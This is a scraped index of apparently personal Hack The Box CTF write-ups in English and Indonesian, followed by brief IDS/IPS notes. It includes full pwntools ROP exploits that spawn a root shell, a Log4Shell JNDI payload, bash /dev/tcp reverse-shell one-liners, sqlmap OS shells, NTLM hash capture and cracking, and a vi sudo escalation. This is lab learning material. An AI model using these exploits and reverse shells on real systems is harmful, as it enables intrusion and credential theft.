; puVar3 = auStack72 ; for ( lVar2 = 8 ; lVar2 != 0 ; lVar2 = lVar2 + -1 ) { * puVar3 = 0 ; puVar3 = puVar3 + ( ulong ) bVar4 * -2 + 1 ; } read ( 0 , auStack72 , 0x1f ); printf ( \"How much do you want for it? \" ); read ( 0 , & local_28 , 8 ); iVar1 = strcmp (( char * ) & local_28 , \"13.37 \\n \" ); if ( iVar1 == 0 ) { puts ( \"Sounds good. Leave details here so I can ask my guy to take a look.\" ); puVar3 = local_20 ; for ( lVar2 = 0x10 ; lVar2 != 0 ; lVar2 = lVar2 + -1 ) { * puVar3 = 0 ; puVar3 = puVar3 + ( ulong ) bVar4 * -2 + 1 ; } read ( 0 , local_20 , 0x40 ); } else { printf ( \"What? %s? The best I can do is 13.37$ \\n \" , & local_28 ); } return ; }","title":"Function"},{"location":"ctf/writeup/htb/htb-pwnshop/#run-program","text":"$ cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ ./pwnshop ========= HTB PwnShop =========== What do you wanna do? 1> Buy 2> Sell 3> Exit > 1 Sorry, we aren't selling right now. But you can place a request. Enter details: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa zsh: segmentation fault ./pwnshop $ uaaavaaawaaaxaaayaaa uaaavaaawaaaxaaayaaa: command not found $ cyclic -l uaaa 80 $ ./pwnshop ========= HTB PwnShop =========== What do you wanna do? 1> Buy 2> Sell 3> Exit > 2 What do you wish to sell? test How much do you want for it? aaaabbbb What? aaaabbbb\ufffd\ufffdUUUU? The best I can do is 13.37$ What do you wanna do? 1> Buy 2> Sell 3> Exit > from running the program, we can get that buy has offset 80 character, and sell has vuln output strings aaaabbbb\ufffd\ufffdUUUU","title":"Run Program"},{"location":"ctf/writeup/htb/htb-pwnshop/#idea","text":"","title":"Idea"},{"location":"ctf/writeup/htb/htb-pwnshop/#leak-binary-address","text":"from sell , we have local_20 = &DAT_001040c0; and read(0,&local_28,8); that we can exploit string aaaabbbb\ufffd\ufffdUUUU has vuln on \ufffd\ufffdUUUU , that the address of .bss( local_20 ) which is the next value of local_28 we need to get hex of \ufffd\ufffdUUUU , then substact with 0x40c0 (local_28 offset address) so that we can get the piebase address io . recv () . decode () io . sendline ( b '2' ) io . recv () . decode () io . sendline ( b 'test' ) io . recv () . decode () leak_pad = b 'a' * 8 io . send ( leak_pad ) resp = io . recv () binary_offset = resp . split ( leak_pad )[ 1 ] binary_offset = binary_offset . split ( b '?' )[ 0 ] binary_offset = bytearray ( binary_offset ) . ljust ( 8 , b ' \\x00 ' ) binary_offset = u64 ( binary_offset , endian = \"little\" ) binary_offset -= 0x40c0 # got from local_20 = &DAT_001040c0; print ( 'piebase :' , hex ( binary_offset ))","title":"Leak binary address"},{"location":"ctf/writeup/htb/htb-pwnshop/#leaking-libc","text":"from buy , we have buffer overflow 80 characters, we can use it for leaking the libc address. we can add payload like image bellow, run in GDB and put break point at buy return so that we can know the process behind (not so necessary). the main idea is print(puts) the libc address, we can use pop_rdi to store the parameter ( got_puts ) and call plt_puts . we use got_puts because it stores puts_libc address. buy function because we need to continue our program, we dont want to stop(segmentation fault) our program $ ropper --file pwnshop --search \"pop rdi\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: pop rdi [INFO] File: pwnshop 0x00000000000013c3: pop rdi; ret; $ ropper --file pwnshop --search \"sub\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: sub [INFO] File: pwnshop 0x000000000000121a: sub esp, 0x28; ret; 0x00000000000013dd: sub esp, 8; add rsp, 8; ret; 0x0000000000001005: sub esp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax; 0x0000000000001219: sub rsp, 0x28; ret; 0x00000000000013dc: sub rsp, 8; add rsp, 8; ret; 0x0000000000001004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax; we will use 0x13c3 as pop_rdi and 0x1219 (to get more space in stack) as sub_rsp. you can get got_puts , plt_puts , and buy_func offset from some tools like ghidra pop_rdi = p64 ( binary_offset + 0x13c3 ) got_puts = p64 ( binary_offset + 0x4018 ) plt_puts = p64 ( binary_offset + 0x1030 ) buy_func = p64 ( binary_offset + 0x132a ) padding_to_rop_chain = 40 * b 'a' # 0x50(ret) - 0x28(sub rsp, 0x28; ret) rop_chain = pop_rdi + got_puts + plt_puts + buy_func padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' sub_rsp = p64 ( binary_offset + 0x1219 ) # sub rsp, 0x28; ret payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . sendline ( b '1' ) io . recv () io . send ( payload ) output = io . recv () leaked_puts_libc = output [: 6 ] leaked_puts_libc = bytearray ( leaked_puts_libc ) . ljust ( 8 , b ' \\x00 ' ) leaked_puts_libc = u64 ( leaked_puts_libc , endian = \"little\" ) print ( 'puts@GLIBC :' , hex ( leaked_puts_libc )) this will print puts_libc address, then we need to find system and /bin/sh in libc, so that we can run buy again and redirect to system('/bin/sh')","title":"Leaking LIBC"},{"location":"ctf/writeup/htb/htb-pwnshop/#find-offset-in-libc","text":"after running the source code and comparing with remote does, we get $ python get_flag.py [+] Starting local process './pwnshop': pid 178594 piebase : 0x555555554000 puts@GLIBC : 0x7ffff7e47e10 $ python get_flag.py [+] Opening connection to 159.65.19.24 on port 32300: Done piebase : 0x558f796d4000 puts@GLIBC : 0x7f1baa0eb6a0 the offset is different, it happens because the libc we use can be different from the libc remote, so we need to check what libc remote is using. https://libc.blukat.me/?q=puts%3A6a0 , after trying we know that libc remote uses libc6_2.23-0ubuntu11.2_amd64 with that information, we can define the system and /bin/sh offset. then we can copy the appropriate offset libc_puts = 0x06f6a0 libc_system = 0x0453a0 libc_sh = 0x18ce17 libc_offset = leaked_puts_libc - libc_puts system = p64 ( libc_offset + libc_system ) print ( 'system :' , hex ( u64 ( system ))) sh = p64 ( libc_offset + libc_sh ) print ( '/bin/sh :' , hex ( u64 ( sh ))) send the payload rop_chain = pop_rdi + sh + system padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . send ( payload ) io . interactive ()","title":"Find offset in LIBC"},{"location":"ctf/writeup/htb/htb-pwnshop/#exploit","text":"$ python get_flag.py [+] Opening connection to 159.65.19.24 on port 32300: Done piebase : 0x5635239db000 puts@GLIBC : 0x7fc5098b46a0 system : 0x7fc50988a3a0 /bin/sh : 0x7fc5099d1e17 [*] Switching to interactive mode $ id uid=0(root) gid=0(root) groups=0(root) $","title":"Exploit"},{"location":"ctf/writeup/htb/htb-pwnshop/#full-code","text":"dont just copy paste, learning the basics is more important! from pwn import * def main (): url = \"159.65.19.24\" port = 32300 io = remote ( url , port ) # io = process('./pwnshop') # Step 1: Leak binary address io . recv () . decode () io . sendline ( b '2' ) io . recv () . decode () io . sendline ( b 'test' ) io . recv () . decode () leak_pad = b 'a' * 8 io . send ( leak_pad ) resp = io . recv () binary_offset = resp . split ( leak_pad )[ 1 ] binary_offset = binary_offset . split ( b '?' )[ 0 ] binary_offset = bytearray ( binary_offset ) . ljust ( 8 , b ' \\x00 ' ) binary_offset = u64 ( binary_offset , endian = \"little\" ) binary_offset -= 0x40c0 # got from local_20 = &DAT_001040c0; print ( 'piebase :' , hex ( binary_offset )) # Step 2: Leaking LIBC pop_rdi = p64 ( binary_offset + 0x13c3 ) got_puts = p64 ( binary_offset + 0x4018 ) plt_puts = p64 ( binary_offset + 0x1030 ) buy_func = p64 ( binary_offset + 0x132a ) padding_to_rop_chain = 40 * b 'a' # 0x50(ret) - 0x28(sub rsp, 0x28; ret) rop_chain = pop_rdi + got_puts + plt_puts + buy_func padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' sub_rsp = p64 ( binary_offset + 0x1219 ) # sup rsp, 0x28; ret payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . sendline ( b '1' ) io . recv () io . send ( payload ) output = io . recv () leaked_puts_libc = output [: 6 ] leaked_puts_libc = bytearray ( leaked_puts_libc ) . ljust ( 8 , b ' \\x00 ' ) leaked_puts_libc = u64 ( leaked_puts_libc , endian = \"little\" ) print ( 'puts@GLIBC :' , hex ( leaked_puts_libc )) # print(output) # Step 3: Find offset in LIBC ### Local # libc_puts = 0x75e10 # libc_system = 0x49860 # libc_sh = 0x198882 ### Remote (libc6_2.23-0ubuntu11.2_amd64) libc_puts = 0x06f6a0 libc_system = 0x0453a0 libc_sh = 0x18ce17 libc_offset = leaked_puts_libc - libc_puts system = p64 ( libc_offset + libc_system ) print ( 'system :' , hex ( u64 ( system ))) sh = p64 ( libc_offset + libc_sh ) print ( '/bin/sh :' , hex ( u64 ( sh ))) # Step 4: Exploit rop_chain = pop_rdi + sh + system padding_to_stack_pivot = ( 72 - len ( padding_to_rop_chain ) - len ( rop_chain )) * b 'b' payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp io . send ( payload ) io . interactive () if __name__ == '__main__' : main ()","title":"Full Code"},{"location":"ctf/writeup/htb/htb-redeemer/","text":"Redeemer \u00b6 #Linux #Redis #Enumeration #Anonymous/Guest Access #Penetration Tester Level 1 nmap -p- -sV <ip_target> Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency The server Redis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface. The CLI The command-line interface (CLI) is a powerful tool that gives you complete access to Redis\u2019s data and its functionalities if you are developing a software or tool that needs to interact with it. Database The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure. sudo apt install redis-cli redis-cli --help redis-cli -h <ip_target> 10.129.8.187:6379> info 10.129.8.187:6379> select 0 10.129.8.187:6379> keys * 10.129.8.187:6379> get flag","title":"Redeemer"},{"location":"ctf/writeup/htb/htb-redeemer/#redeemer","text":"#Linux #Redis #Enumeration #Anonymous/Guest Access #Penetration Tester Level 1 nmap -p- -sV <ip_target> Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency The server Redis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface. The CLI The command-line interface (CLI) is a powerful tool that gives you complete access to Redis\u2019s data and its functionalities if you are developing a software or tool that needs to interact with it. Database The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure. sudo apt install redis-cli redis-cli --help redis-cli -h <ip_target> 10.129.8.187:6379> info 10.129.8.187:6379> select 0 10.129.8.187:6379> keys * 10.129.8.187:6379> get flag","title":"Redeemer"},{"location":"ctf/writeup/htb/htb-reg/","text":"Reg pwn Intro to Binary Exploitation htb-pwn Reg.zip hackthebox $ checksec --file=reg RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 80) Symbols No 0 3 reg Just need redirect to winner function, because the PIE is set to No PIE then the address will always be the same from pwn import * context . log_level = 'DEBUG' # io = process('./reg') url = \"188.166.172.138\" port = 31220 io = remote ( url , port ) # Step 0: Enumerate Binary context ( os = 'linux' , arch = 'amd64' ) # Step 1: Payload addr = p64 ( 0x0000000000401206 ) payload = b 'a' * 0x30 + b 'b' * 8 + addr # Step 2: Run print ( io . recv () . decode ()) io . sendline ( payload ) print ( io . recv () . decode ())","title":"Reg"},{"location":"ctf/writeup/htb/htb-responder/","text":"Responder \u00b6 nmap -sV -p- --min-rate 5000 <ip_target> curl <ip_target> Name-Based Virtual \u00b6 Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname. echo \"<ip_target> unika.htb\" | sudo tee -a /etc/hosts # kalau error echo \"<ip_target>\\tunika.htb\" | sudo tee -a /etc/hosts open website unika.htb from your browser the website is vulnerable with LFI here http://unika.htb/index.php?page=/../../../../../../../../windows/system32/drivers/etc/hosts NTLM \u00b6 NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain. Detail NTLM Resoponder \u00b6 In the PHP configuration file php.ini , \"allow_url_include\" wrapper is set to \"Off\" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to \"Off\", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash hacktricks Responder Start \u00b6 git clone https://github.com/lgandx/Responder cd Responder cat Responder.conf sudo python3 Responder.py -I tun0 http://unika.htb/index.php?page=//<your_ip>/tes echo \"Administrator::RESPONDER:3f5e727d7ed35f9chash.txt $ john -w=/path/to/rockyou.txt hash.txt badminton (Administrator) WinRM \u00b6 We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario. sudo apt install evil-winrm evil-winrm -i <ip_target> -u administrator -p badminton flag is in C:\\Users\\mike\\Desktop","title":"Responder"},{"location":"ctf/writeup/htb/htb-responder/#responder","text":"nmap -sV -p- --min-rate 5000 <ip_target> curl <ip_target>","title":"Responder"},{"location":"ctf/writeup/htb/htb-responder/#name-based-virtual","text":"Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname. echo \"<ip_target> unika.htb\" | sudo tee -a /etc/hosts # kalau error echo \"<ip_target>\\tunika.htb\" | sudo tee -a /etc/hosts open website unika.htb from your browser the website is vulnerable with LFI here http://unika.htb/index.php?page=/../../../../../../../../windows/system32/drivers/etc/hosts","title":"Name-Based Virtual"},{"location":"ctf/writeup/htb/htb-responder/#ntlm","text":"NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain. Detail NTLM","title":"NTLM"},{"location":"ctf/writeup/htb/htb-responder/#resoponder","text":"In the PHP configuration file php.ini , \"allow_url_include\" wrapper is set to \"Off\" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to \"Off\", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash hacktricks Responder","title":"Resoponder"},{"location":"ctf/writeup/htb/htb-responder/#start","text":"git clone https://github.com/lgandx/Responder cd Responder cat Responder.conf sudo python3 Responder.py -I tun0 http://unika.htb/index.php?page=//<your_ip>/tes echo \"Administrator::RESPONDER:3f5e727d7ed35f9chash.txt $ john -w=/path/to/rockyou.txt hash.txt badminton (Administrator)","title":"Start"},{"location":"ctf/writeup/htb/htb-responder/#winrm","text":"We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario. sudo apt install evil-winrm evil-winrm -i <ip_target> -u administrator -p badminton flag is in C:\\Users\\mike\\Desktop","title":"WinRM"},{"location":"ctf/writeup/htb/htb-sequel/","text":"Sequel \u00b6 Pract \u00b6 nmap -sV -sC <ip_target> mysql -h <ip_target> -u root -p SHOW DATABASES; USE htb; SHOW TABLES; SELECT * FROM config;","title":"Sequel"},{"location":"ctf/writeup/htb/htb-sequel/#sequel","text":"","title":"Sequel"},{"location":"ctf/writeup/htb/htb-sequel/#pract","text":"nmap -sV -sC <ip_target> mysql -h <ip_target> -u root -p SHOW DATABASES; USE htb; SHOW TABLES; SELECT * FROM config;","title":"Pract"},{"location":"ctf/writeup/htb/htb-tactics/","text":"Tactics \u00b6 nmap -sV -sT -Pn -v <target_ip> PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? smbclient -L <target_ip> -U Administrator smbclient \\\\\\\\<target_ip>\\\\ADMIN$ -U Administrator smbclient \\\\\\\\<target_ip>\\\\C$ -U Administrator Which tool that is part of the Impacket collection can be used to get an interactive shell on the system? psexec.py","title":"Tactics"},{"location":"ctf/writeup/htb/htb-tactics/#tactics","text":"nmap -sV -sT -Pn -v <target_ip> PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? smbclient -L <target_ip> -U Administrator smbclient \\\\\\\\<target_ip>\\\\ADMIN$ -U Administrator smbclient \\\\\\\\<target_ip>\\\\C$ -U Administrator Which tool that is part of the Impacket collection can be used to get an interactive shell on the system? psexec.py","title":"Tactics"},{"location":"ctf/writeup/htb/htb-unified/","text":"Unified \u00b6 #Linux #Web #CVE nmap -sC -sV -v <target_ip> PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy 8443/tcp open ssl/nagios-nsca Nagios NSCA UniFy 6.4.54 exploit article discuss CVE-2021-44228 Log4J langkah selanjutnya exploitasi login page dengan burp suite edit request json field remember (why?) dengan \"${jndi:ldap://{Tun0 IP Address}/whatever}\" (how?) JNDI is the acronym for the Java Naming and Directory Interface API. By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems. LDAP is the acronym for Lightweight Directory Access Protocol, which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389. karena server memberikan response, maka sistem vulnerable mencoba analisa paket sudo tcpdump -i tun0 port 389 menunjukkan kalau target mencoba connect back ke kita atau yang artinya sistem vulnerable selanjutanya, membuat payload untuk dikirim ke target aplikasi # keperluan menjalankan aplikasi java sudo apt update sudo apt install openjdk-11-jdk sudo apt install maven # keperluan aplikasi koneksi LDAP server git clone https://github.com/veracode-research/rogue-jndi cd rogue-jndi mvn package rogue-jndi/target/RogueJndi-1.1.jar membuat payload dalam base64 agar tdk ada issues encoding echo 'bash -c bash -i >& /dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64 misal port 4444 run Rogue-JNDI java -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,<BASE64 STRING HERE>}|{base64,-d}|{bash,-i}\" --hostname \"<your_ip>\" membuat listener nc -lvp 4444 # atau nc -nlvp 4444 # jangan lupa allow firewall port 4444 kembali ke burp suite, ubah request ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} kembali ke listener script /dev/null -c bash didapat user , lalu mencari privileges cek Mongo DB yang memungkinkan mendapat credential ps aux | grep mongo mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\" | more ubah hash password administrator mkpasswd -m sha-512 Password1234 mongo --port 27117 ace --eval 'db.admin.update({\"_id\": ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"<SHA_512 Hash Generated>\"}})' cek lagi jika perlu mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\" | more login ke website dan cari setting->site ssh authentication setting","title":"Unified"},{"location":"ctf/writeup/htb/htb-unified/#unified","text":"#Linux #Web #CVE nmap -sC -sV -v <target_ip> PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy 8443/tcp open ssl/nagios-nsca Nagios NSCA UniFy 6.4.54 exploit article discuss CVE-2021-44228 Log4J langkah selanjutnya exploitasi login page dengan burp suite edit request json field remember (why?) dengan \"${jndi:ldap://{Tun0 IP Address}/whatever}\" (how?) JNDI is the acronym for the Java Naming and Directory Interface API. By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems. LDAP is the acronym for Lightweight Directory Access Protocol, which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389. karena server memberikan response, maka sistem vulnerable mencoba analisa paket sudo tcpdump -i tun0 port 389 menunjukkan kalau target mencoba connect back ke kita atau yang artinya sistem vulnerable selanjutanya, membuat payload untuk dikirim ke target aplikasi # keperluan menjalankan aplikasi java sudo apt update sudo apt install openjdk-11-jdk sudo apt install maven # keperluan aplikasi koneksi LDAP server git clone https://github.com/veracode-research/rogue-jndi cd rogue-jndi mvn package rogue-jndi/target/RogueJndi-1.1.jar membuat payload dalam base64 agar tdk ada issues encoding echo 'bash -c bash -i >& /dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64 misal port 4444 run Rogue-JNDI java -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,<BASE64 STRING HERE>}|{base64,-d}|{bash,-i}\" --hostname \"<your_ip>\" membuat listener nc -lvp 4444 # atau nc -nlvp 4444 # jangan lupa allow firewall port 4444 kembali ke burp suite, ubah request ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} kembali ke listener script /dev/null -c bash didapat user , lalu mencari privileges cek Mongo DB yang memungkinkan mendapat credential ps aux | grep mongo mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\" | more ubah hash password administrator mkpasswd -m sha-512 Password1234 mongo --port 27117 ace --eval 'db.admin.update({\"_id\": ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"<SHA_512 Hash Generated>\"}})' cek lagi jika perlu mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\" | more login ke website dan cari setting->site ssh authentication setting","title":"Unified"},{"location":"ctf/writeup/htb/htb-vaccine/","text":"Vaccine \u00b6 #Linux #FTP #SQL #SUID nmap -sV -sC <target_ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 00:59 WIB Nmap scan report for <target_ip> Host is up (0.27s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.15.153 | Logged in as ftpuser | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: MegaCorp Login |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.13 seconds ftp <target_ip> anonymous ls get backup.zip zip2john backup.zip > cracked john cracked hashid 2cb42f8734ea607eefed3b70af13bbd3 echo 2cb42f8734ea607eefed3b70af13bbd3 > hash hashcat -a 0 -m 0 hash /usr/share/wordlist/rockyou.txt sqlmap -u 'http://<target_ip>/dashboard.php?search=a' --cookie=\"PHPSESSID=tra9r85r0n2sfddee3h7h0l1l4\" sqlmap -u 'http://<target_ip>/dashboard.php?search=a' --cookie=\"PHPSESSID=tra9r85r0n2sfddee3h7h0l1l4\" --os-shell buat listener sudo nc -lvnp 443 bash -c \"bash -i >& /dev/tcp/{your_IP}/443 0>&1\" python3 -c 'import pty;pty.spawn(\"/bin/bash\")' CTRL+Z stty raw -echo fg export TERM=xterm /var/www/html/dashboard.php user=postgres password=P@s5w0rd! ssh postgres@<ip_target> https://gtfobins.github.io/gtfobins/vi/#sudo sudo -l sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh :shell whoami done","title":"Vaccine"},{"location":"ctf/writeup/htb/htb-vaccine/#vaccine","text":"#Linux #FTP #SQL #SUID nmap -sV -sC <target_ip> Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 00:59 WIB Nmap scan report for <target_ip> Host is up (0.27s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.15.153 | Logged in as ftpuser | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: MegaCorp Login |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.13 seconds ftp <target_ip> anonymous ls get backup.zip zip2john backup.zip > cracked john cracked hashid 2cb42f8734ea607eefed3b70af13bbd3 echo 2cb42f8734ea607eefed3b70af13bbd3 > hash hashcat -a 0 -m 0 hash /usr/share/wordlist/rockyou.txt sqlmap -u 'http://<target_ip>/dashboard.php?search=a' --cookie=\"PHPSESSID=tra9r85r0n2sfddee3h7h0l1l4\" sqlmap -u 'http://<target_ip>/dashboard.php?search=a' --cookie=\"PHPSESSID=tra9r85r0n2sfddee3h7h0l1l4\" --os-shell buat listener sudo nc -lvnp 443 bash -c \"bash -i >& /dev/tcp/{your_IP}/443 0>&1\" python3 -c 'import pty;pty.spawn(\"/bin/bash\")' CTRL+Z stty raw -echo fg export TERM=xterm /var/www/html/dashboard.php user=postgres password=P@s5w0rd! ssh postgres@<ip_target> https://gtfobins.github.io/gtfobins/vi/#sudo sudo -l sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh :shell whoami done","title":"Vaccine"},{"location":"ctf/writeup/overthewire/","text":"","title":"Overthewire"},{"location":"cybersecurity/firewall/","text":"Firewall \u00b6 referensi bacaan https://id.wikipedia.org/wiki/Tembok_api","title":"Firewall"},{"location":"cybersecurity/firewall/#firewall","text":"referensi bacaan https://id.wikipedia.org/wiki/Tembok_api","title":"Firewall"},{"location":"cybersecurity/idsips/","text":"IDS/IPS \u00b6 from tryhackme.com Intrusion Detection System (IDS) \u00b6 IDS adalah passive monitoring untuk mendeteksi kemungkinan aktivitas berbahaya, insiden abnormal, dan pelanggaran kebijakan. Bertanggung jawab untuk menghasilkan peringatan untuk setiap peristiwa yang mencurigakan. Terdapat 2 tipe IDS: Network Intrusion Detection System (NIDS) NIDS memonitor alur lalu lintas dari berbagai area jaringan. Tujuannya adalah untuk menyelidiki lalu lintas di seluruh subnet. jika signature diidentifikasi, maka akan dibuat alert . Host-based Intrusion Detection System (HIDS) HIDS memonitor arus lalu lintas dari satu perangkat titik akhir. Tujuannya adalah untuk menyelidiki lalu lintas pada perangkat tertentu. Jika signature diidentifikasi, maka akan dibuat alert . Intrusion Prevention System (IPS) \u00b6 IPS adalah active protection untuk mencegah kemungkinan aktivitas berbahaya, insiden abnormal, dan pelanggaran kebijakan. Bertanggung jawab untuk menghentikan/mencegah/mengakhiri kejadian yang mencurigakan segera setelah deteksi dilakukan. Terdapat 4 tipe IDS: Network Intrusion Prevention System (NIPS) NIPS memonitor arus lalu lintas dari berbagai area jaringan. Tujuannya adalah untuk melindungi lalu lintas di seluruh subnet. Jika signature diidentifikasi, koneksi dihentikan. Network Behaviour Analysis (NBA) Sistem-berbasis-perilaku memantau lalu lintas lintas dari berbagai area jaringan. Tujuannya adalah untuk melindungi lalu lintas di seluruh subnet. Jika signature diidentifikasi, koneksi dihentikan. Sistem-Analisis-Perilaku Jaringan bekerja mirip dengan NIPS. Perbedaan antara NIPS dan Behavior-based adalah sistem-berbasis-perilaku memerlukan periode pelatihan (juga dikenal sebagai \"baselining\") untuk mempelajari lalu lintas normal dan membedakan lalu lintas dan ancaman berbahaya. Model ini memberikan hasil yang lebih efisien terhadap ancaman baru. Sistem dilatih untuk mengetahui \"normal\" untuk mendeteksi \"abnormal\". Periode pelatihan sangat penting untuk menghindari false positive . Jika terjadi pelanggaran keamanan selama periode 